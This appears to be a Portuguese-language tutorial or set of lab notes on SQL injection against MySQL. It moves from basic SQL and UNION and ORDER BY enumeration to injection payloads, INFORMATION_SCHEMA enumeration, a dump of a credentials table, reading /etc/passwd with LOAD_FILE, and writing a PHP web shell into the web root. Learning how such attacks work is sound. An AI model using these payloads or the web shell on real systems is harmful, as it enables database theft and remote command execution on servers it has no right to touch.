## Intro
Essa técnica diz respeito a conseguirmos injetar uma `querie` e então mudarmos a lógica da `querie` original por uma de nosso desejo.
 
Na maioria das vezes podemos validar se há essa vulnerabilidade em alguma entrada de texto apenas inserindo `'` ou `"` para conseguirmos quebrar a lógica da `querie`. Há muitas maneiras de explorar isso, como usando `stacked queries` ou `Union queries`.

Temos alguns tipos de `SQL injection` como:
- **`In-band`** - Quando a saída da consulta pode ser impressa no output.
	- ``Union Based`` - Quando utilizamos  consultas com `union`. Podemos ter que especificar o local exato da tabela.
	- ``Error Based`` - Quando geramos algum erro para termos algumas informações do banco.
- **`Blind`** - Em alguns casos mais complicados, não teremos uma saída para analisar.
	- ``Boolean Based`` - Podemos usar instruções condicionais SQL para controlar se a página retorna alguma saída, ou seja, resposta original da consulta, se nossa instrução condicional retornar ``TRUE``.
	- ``Time Based`` - Usamos declarações condicionais SQL que atrasam a resposta da página se a instrução condicional retornar true usando a função ``Sleep()``.
- **`Out-of-band`** - Em alguns casos, podemos não ter acesso direto à saída, por isso podemos ter que direcionar a saída para um local remoto
***
## Comandos
Primeiro vamos ver alguns comandos SQL básicos.
### CRUD
Existem vários comandos no SQL mas os mais comuns são os chamados CRUD (CREATE, READ, UPDATE, DELETE) representados pelos comandos:

- **``INSERT``** - Insere registros no banco de dados.
- **``SELECT``** - Retorna informações do banco de dados.
- **``UPDATE``** - Atualiza os registros no banco de dados.
- **``DELETE``** - Deleta os registros do banco de dados.

``INSERT INTO <table_name> (<column>, <column>) VALUES (>value>, <value>);``

`SELECT <column>,<column> FROM <table_name>`;

`UPDATE <table_name> SET <column> = <value> WHERE <key_name> = <key_name>;`

`DELETE FROM <table_name> WHERE <key_name> = <key_name>;`
#### Exemplos
```sql
INSERT INTO users(name,password) VALUES ("Nycolas","n!c0l4s");

SELECT name,password FROM users WHERE name = "Nycolas";

UPDATE users SET name = "Nycolas Ramos" WHERE name = "Nycolas";

DELETE FROM user WHERE name = "Atylas";
```

### Comentários
Podemos comentar tanto somente uma linha quanto um bloco de código.

- **`--`** : Comenta uma linha de código.
- **`#`** : Comenta uma linha de código.
- **`/* */`** : Comenta um bloco de código.

```sql
-- INSERT INTO users(name,password) VALUES ("Nycolas","n!c0l4s");

# SELECT name,password FROM users WHERE name = "Nycolas";

/*UPDATE users SET name = "Nycolas Ramos" WHERE name = "Nycolas";

DELETE FROM user WHERE name = "Atylas";
*/

SELECT name,password FROM users WHERE name = "Nycolas";
```

### UNION
Com o `union` podemos juntar consultas.

```sql
SELECT name,password FROM users union select name FROM flag;
```
Aqui além de trazer os campos `name` e `password` da tabela `users` ele irá trazer o campo `name` da tabela `flag`. Ao fazer a união, é interessante que retornemos a mesma quantidade de campos dos dois lados.

Para realizar isso, podemos colocar valores como números para serem retornados.
```sql
SELECT name,password FROM users union select name,1 FROM flag;
```

### ORDER BY
É importante sabermos quantos campos tem a nossa tabela, podemos descobrir isso com a ordenação.

Com esse método vamos por acerto e erro. Vamos ordenando at achar um número que não nos retorna os registros, então encontramos o limite da tabela.

```sql
SELECT name, description FROM products ORDER BY 1;
-- Aqui ordenamos pela primeira coluna;

SELECT name, description FROM products ORDER BY 2;
-- Aqui ordenamos pela primeira coluna;

SELECT name, description FROM products ORDER BY 3;
-- Aqui ordenamos pela primeira coluna;
```

### Prática
Digamos que temos um input de pesquisa  de produtos que realiza a seguinte querie : 

```sql
SELECT name,description FROM products WHERE name LIKE '%<USER INPUT>%';
```

Caso não haja o tratamento adequado do input podemos fechar essa condição e inserir uma nova e alterar as queries : 

**Input normal**
<input style="width:100%;padding:5px;font-size:18pt;" value="notebook">
```sql
SELECT name,description FROM products WHERE name LIKE '%notebook%';
```

**SQL INJECTION**
<input style="width:100%;padding:5px;font-size:18pt;" value="não existe' or 1=1 -- -">
```sql
SELECT name,description FROM products WHERE name LIKE '%não existe' or 1=1 -- -%';
```
Com essa ``query`` retornamos todos os itens do banco de dados;

**SQL INJECTION**
<input style="width:100%;padding:5px;font-size:18pt;" value="' or 1=1 union SELECT name,2 FROM flag; -- - ">
```sql
SELECT name,description FROM products WHERE name LIKE '' or 1=1 union SELECT name,2 FROM flag; -- - ';
```
Aqui conseguimos retornar o campo nome da tabela flag;
***
# Enumerando o banco de dados
Podemos obter algumas informações do próprio banco de dados com algumas funções;
- **`database()`** - Retorna o banco a base de dados que está em uso.
- **`username()`** - Retorna o usuário da conexão do banco de dados.
- **`@@version`** - Retorna a versão do banco de dados;

## INFORMATION_SCHEMA Database
Para pegar dados usando o `UNION SELECT` precisamos de algumas informações como :
- Lista dos bancos de dados.
- Listas das tabelas de cada banco.
- Lista das colunas de cada tabela.

O banco de dados `INFORMATION_SCHEMA` contém informações sobre os banco de dados e as tabelas no nosso servidor. E é essencial na exploração.
#### SCHEMATA
A  tabela `SCHEMATA` no banco de dados `INFORMATION_SCHEMA` contém informações sobre todos os bancos no servidor.

A Coluna `SCHEMA_NAME` contém o nome de todas as base de dados presente.
```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| ilfreight          |
| dev                |
+--------------------+
```
#### TABLES
Para listarmos todas as tabelas na base de dados podemos usar a tabela `TABLES` na base de dados `INFORMATION_SCHEMA`. Essa tabela  contém múltiplas colunas, mas estamos interessados na `TABLE_SCHEMA` e `TABLE_NAME`.

A `TABLE_NAME` armazena o nome das tabelas, enquanto `TABLE_SCHEMA` aponta para qual base de dados cada tabela pertence.

Agora que temos o  nomes das base dedados podemos enumerar suas tabelas.
```sql
SELECT TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dev';

+--------------------+--------------------+
| TABLE_NAME         | TABLE_SCHEMA       |
+--------------------+--------------------+
| id                 | dev                |
| name               | dev                |
| rule               | dev                |
+--------------------+--------------------+
```
#### COLUMNS
Podemos também achar o nome das colunas na tabela `COLUMNS` da base de dados `INFORMATION_SCHEMA`. A tabela `COLUMNS` contém informações sobre todas as colunas presentes na base de dados. Ainda podemos usar as colunas `TABLE_NAME` e `TABLE_SCHEMA` para sabermos a qual tabela e base de dados ela pertence.
```sql
SELECT COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='credentials';

+----------------+-----------------+-----------------+
| TABLE_NAME     | TABLE_NAME      | TABLE_SCHEMA    |
+----------------+-----------------+-----------------+
| id             | credentials     | dev             |
| username       | credentials     | dev             |
| password       | credentials     | dev             |
+----------------+-----------------+-----------------+
```
#### Data
Agora que sabemos o nome das colunas tabelas e a qual base de dados pertence, podemos recuperar os dados que queremos.
```sql
SELECT username,password FROM dev.credentials;

+----------------+----------------------------------+
| username       | password                         |
+----------------+----------------------------------+
| admin          | 392037dbba51f692776d6cefb6dd546d |
| newuser        | 9da2c9bcdf39d8610954e0e11ea8f45f |
+----------------+----------------------------------+
```
***
# Privilégios
É comum que um usuário privilegiado sejam usados para gerenciar o banco de dados, também podemos descobrir qual usuário está sendo executado e qual suas permissões.
#### Usuários
Podemos descobrir qual é o usuário sendo executado com qualquer um dos comandos a seguir:
```sql
SELECT USER();
SELECT CURRENT_USER();
SELECT user from mysql.user;
```
#### Privilégio dos usuários
Podemos também ver seus privilégios.

Podemos testar se nosso usuário tem `super` privilégios.
```sql
SELECT super_priv FROM mysql.user;
```

Também podemos ver quais usuários tem quais privilégios, e se quisermos podemos filtrar pelo usuário que queremos.
```sql
SELECT grantee,privilege_type FROM information_schema.user_privileges WHERE grantee="root@localhost";
```
***
# Arquivos
Caso algum usuário apresente a permissão `FILE`, podemos usa-lo para ler  e editar arquivos do sistema. O usuário deve ter permissão para fazer tal operação no sistema host, para escrever também é necessário que a variável global `secure_file_priv` não esteja habilitada.
#### Lendo arquivos
Usamos a função `LOAD_FILE()` para recuperar o conteúdo de algum arquivo.
```sql
SELECT LOAD_FILE('/etc/passwd');
```
#### Verificando `secure_file_priv`
Primeiro verificamos se a variável `secure_file_priv` está desabilitada.
```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

Para usarmos como o `UNION` devemos usar a declaração `SELECT`. As variáveis globais ficam armazenadas em `information_schema.global_variables` que detém 2 campos `variable_name` e `variable_value`;
```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv";
```
#### Escrevendo nos arquivos
Podemos usar a declaração `SELECT INTO OUTFILE` para escrever nos arquivos.
```sql
SELECT * FROM users INTO OUTFILE '/tmp/credentials';
```
E então podemos verificar se o arquivo foi criado.
```bash
[~] cat /tmp/credentials

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```

Também podemos selecionar uma string anexarmos em algum arquivo.
```sql
SELECT 'This is a test !!!' INTO OUTFILE '/tmp/test.txt';
```

Podemos então criar uma shell `PHP` para ser executada.
```sql
SELECT '<?php system($_REQUEST[0]); ?>' INTO OUTFILE '/var/www/html/shel.php';
```
